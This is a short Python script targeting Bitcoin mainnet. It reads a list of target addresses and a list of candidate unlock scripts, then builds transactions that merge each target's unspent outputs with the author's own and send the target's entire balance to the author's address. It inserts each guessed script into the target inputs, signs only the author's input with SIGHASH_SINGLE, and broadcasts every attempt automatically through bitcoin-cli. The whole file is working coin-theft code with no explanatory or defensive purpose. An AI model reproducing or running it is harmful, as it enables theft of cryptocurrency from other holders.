#!/usr/bin/env python3

from cryptos import *
from pprint import pprint
import cryptos
import subprocess
import sys

c = Bitcoin(testnet=False)

priv=b''
addrmyfrom=''
addrmyto=''
moje=c.unspent(addrmyfrom)

o=open('broadcast.txt','w')
a=1
ct=sum(1 for line in open('target.txt'))
cs=sum(1 for line in open('script.txt'))
for target in open('target.txt'):
	target=target.strip()
	jego=c.unspent(target)
	b=1
	for s in open('script.txt'):
		s=s.strip()
		ins = moje + jego
		bal=0
		for i in jego:
			bal += i['value']
		outs = [{'address': addrmyto, 'value': bal}]
		tx = c.mktx(ins, outs)
		for i in tx['ins'][1:]:
			i['script']=s
		tx['locktime']=0
		tx['hash_type']=0x03
		tx = c.sign(tx, 0, priv)
		#pprint(tx)
		t=serialize(tx)
		#print(t)
		o.write(t+'\n')
		o.flush()
		print("Line: "+str(a*cs+b)+"/"+str(ct*cs),file=sys.stderr)
		subprocess.run(["/mnt/c/Program Files/Bitcoin/daemon/bitcoin-cli.exe","sendrawtransaction",t])
		print(file=sys.stderr)
		b=b+1
	a=a+1
